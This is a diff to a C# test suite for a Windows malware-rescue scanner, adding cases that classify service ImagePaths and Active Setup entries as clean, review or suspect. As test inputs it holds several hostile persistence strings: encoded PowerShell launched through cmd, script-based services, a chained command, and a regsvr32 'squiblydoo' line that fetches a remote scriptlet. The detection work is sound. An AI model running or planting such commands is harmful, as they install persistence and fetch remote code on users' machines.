@@ -90,6 +90,7 @@ namespace RescueScan.Tests
                 Run("Tasks: XML + TaskCache join, registry-only/hidden tasks, cleanup keys", ScanTasksCases);
                 Run("Control set: Select\\Default, fallbacks, warnings", ControlSetCases);
                 Run("Session Manager extras + AppCertDlls key; Policies Run once", SessionMgrExtraCases);
+                Run("Services/ServiceDll listing + Active Setup built-ins", ServiceAndActiveSetupCases);
                 Run("SysExe: absolute System32 path [win]", SysExeWin);
                 Run("Values: raw types .NET cannot read (REG_RESOURCE_LIST, custom) [win]", RawTypesWin);
                 Run("Pairs/DeleteKey: registry symbolic links are not followed [win]", LinksWin);
@@ -2080,6 +2081,72 @@ namespace RescueScan.Tests
             MainForm.ScanExtraSoftware(f, Root + "\\pol");
             int n = 0; foreach (Finding x in f) if (x.Name == "gpo" || x.Name == "w") n++;
             Eq(1, n, "Policies Run once, native only");
+        }
+
+        // Services: clean Windows 10/11 ImagePaths are not listed (incl. Defender in ProgramData); REVIEW locations are
+        // listed; interpreters / scripts / Windows-root images are SUSPECT. Active Setup: Microsoft components clean.
+        static void ServiceAndActiveSetupCases()
+        {
+            string[] clean = {
+                "\\SystemRoot\\System32\\drivers\\ACPI.sys", "system32\\drivers\\wd\\WdFilter.sys", "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p",
+                "C:\\Windows\\system32\\lsass.exe", "%SystemRoot%\\system32\\msiexec.exe /V", "C:\\Windows\\servicing\\TrustedInstaller.exe",
+                "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe", "%systemroot%\\system32\\spoolsv.exe",
+                "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe\"",
+                "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\NisSrv.exe\"",
+                "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MpDefenderCoreService.exe\"",
+                "\\??\\C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{5B1F2B0C-8E0B-4F2B-9C1E-1234567890AB}\\MpKslDrv.sys",
+                "\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe\"",
+                "\\SystemRoot\\System32\\DriverStore\\FileRepository\\nv.inf_amd64_x\\nvlddmkm.sys", "", "System32\\drivers\\fvevol.sys",
+            };
+            foreach (string c in clean) Eq("", MainForm.ServiceRisk(c), "clean service: " + c);
+            Eq("REVIEW", MainForm.ServiceRisk("C:\\ProgramData\\WindowsTask\\svchost.exe"), "ProgramData service listed");
+            Eq("REVIEW", MainForm.ServiceRisk("C:\\Users\\Public\\Libraries\\svc.exe"), "Public service listed");
+            Eq("REVIEW", MainForm.ServiceRisk("\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\..\\..\\x\\MsMpEng.exe\""), "no .. games");
+            string[] bad = {
+                "cmd.exe /c start C:\\ProgramData\\w\\checker.bat", "cmd /c C:\\Windows\\upd.bat", "wscript.exe C:\\Windows\\w.vbs",
+                "C:\\Windows\\System32\\cmd.exe /c powershell -nop -w 1 -e JAB", "%COMSPEC% /c x", "C:\\Windows\\svchost.exe", "C:\\Windows\\Temp\\svc.exe",
+                "powershell -File C:\\Windows\\x.ps1", "C:\\Windows\\x.bat",
+            };
+            foreach (string c in bad) Eq("SUSPECT", MainForm.ServiceRisk(c), "SUSPECT service: " + c);
+            using (RegistryKey k = Make("svc\\Services\\good")) k.SetValue("ImagePath", "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p");
+            using (RegistryKey k = Make("svc\\Services\\good\\Parameters")) k.SetValue("ServiceDll", "%SystemRoot%\\System32\\wuaueng.dll");
+            using (RegistryKey k = Make("svc\\Services\\miner")) k.SetValue("ImagePath", "C:\\ProgramData\\WindowsTask\\svchost.exe");
+            using (RegistryKey k = Make("svc\\Services\\bat")) k.SetValue("ImagePath", "cmd.exe /c start C:\\ProgramData\\w\\checker.bat");
+            using (RegistryKey k = Make("svc\\Services\\dll\\Parameters")) k.SetValue("ServiceDll", "C:\\Users\\Public\\x.dll");
+            List<Finding> f = new List<Finding>();
+            MainForm.ScanServices(f, Root + "\\svc", new List<string>());
+            Eq(3, f.Count, "miner + bat + ServiceDll");
+            Eq("REVIEW", FindName(f, "miner").Risk, "miner REVIEW (listed)");
+            Eq("SUSPECT", FindName(f, "bat").Risk, "cmd service SUSPECT");
+            Finding d = FindName(f, "dll");
+            Eq(0, d.Kind, "ServiceDll: the value");
+            Eq("ServiceDll", d.DelName, "value name");
+            // Active Setup: Microsoft components of a clean Windows 10/11
+            string[][] ms = {
+                new string[] { "{2C7339CF-2B09-4501-B3F3-F3508C9228ED}", "%SystemRoot%\\system32\\regsvr32.exe /s /n /i:/UserInstall %SystemRoot%\\system32\\themeui.dll" },
+                new string[] { "{89820200-ECBD-11cf-8B85-00AA005B4340}", "regsvr32.exe /s /n /i:U shell32.dll" },
+                new string[] { "{2D46B6DC-2207-486B-B523-A557E6D54B47}", "C:\\Windows\\System32\\cmd.exe /D /C start C:\\Windows\\System32\\ie4uinit.exe -ClearIconCache" },
+                new string[] { ">{26923b43-4d38-484f-9b9e-de460746276c}", "C:\\Windows\\System32\\ie4uinit.exe -UserConfig" },
+                new string[] { "{89B4C1CD-B018-4511-B0A1-5476DBF70820}", "C:\\Windows\\System32\\Rundll32.exe C:\\Windows\\System32\\mscories.dll,Install" },
+                new string[] { "{89B4C1CD-B018-4511-B0A1-5476DBF70820}", "C:\\Windows\\SysWOW64\\Rundll32.exe C:\\Windows\\SysWOW64\\mscories.dll,Install" },
+                new string[] { "{6BF52A52-394A-11d3-B153-00C04F79FAA6}", "\"%SystemRoot%\\system32\\unregmp2.exe\" /FirstLogon" },
+                new string[] { ">{22d6f312-b0f6-11d0-94ab-0080c74c7e95}", "%SystemRoot%\\system32\\unregmp2.exe /ShowWMP" },
+                new string[] { "{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}", "\"C:\\Windows\\System32\\rundll32.exe\" \"C:\\Windows\\System32\\iesetup.dll\",IEHardenAdmin" },
+                new string[] { "{44BBA840-CC51-11CF-AAFA-00AA00B6015C}", "\"%ProgramFiles%\\Windows Mail\\WinMail.exe\" OCInstallUserConfigOE" },
+                new string[] { "{9459C573-B17A-45AE-9F64-1857B5D58CEE}", "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\130.0.2849.68\\Installer\\setup.exe\" --configure-user-settings --verbose-logging --system-level --msedge --channel=stable" },
+            };
+            foreach (string[] a in ms) True(Defaults.ActiveSetupClean(a[0], a[1]), "built-in Active Setup clean: " + a[0]);
+            True(!Defaults.ActiveSetupClean("{2D46B6DC-2207-486B-B523-A557E6D54B47}", "C:\\Windows\\System32\\cmd.exe /D /C start C:\\Windows\\System32\\ie4uinit.exe & C:\\ProgramData\\x.exe"), "chained command");
+            True(!Defaults.ActiveSetupClean("{2C7339CF-2B09-4501-B3F3-F3508C9228ED}", "C:\\ProgramData\\regsvr32.exe /s themeui.dll"), "wrong folder");
+            True(!Defaults.ActiveSetupClean("{2C7339CF-2B09-4501-B3F3-F3508C9228ED}", "regsvr32 /s /i:http://x/a.sct scrobj.dll themeui.dll"), "squiblydoo");
+            True(!Defaults.ActiveSetupClean("{11111111-2B09-4501-B3F3-F3508C9228ED}", "regsvr32.exe /s /n /i:U shell32.dll"), "unknown GUID");
+            using (RegistryKey k = Make("as\\Microsoft\\Active Setup\\Installed Components\\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}")) k.SetValue("StubPath", ms[0][1]);
+            using (RegistryKey k = Make("as\\Microsoft\\Active Setup\\Installed Components\\{00000000-0000-0000-0000-00000000BAD1}")) k.SetValue("StubPath", "C:\\ProgramData\\x\\a.exe");
+            f.Clear();
+            MainForm.ScanExtraSoftware(f, Root + "\\as");
+            int clean2 = 0, rev = 0;
+            foreach (Finding x in f) if (x.Category == "Active Setup") { if (x.Risk == "") clean2++; else if (x.Risk == "REVIEW") rev++; }
+            Eq(1, clean2, "Themes Setup row clean"); Eq(1, rev, "unknown component REVIEW");
         }
     }
 }
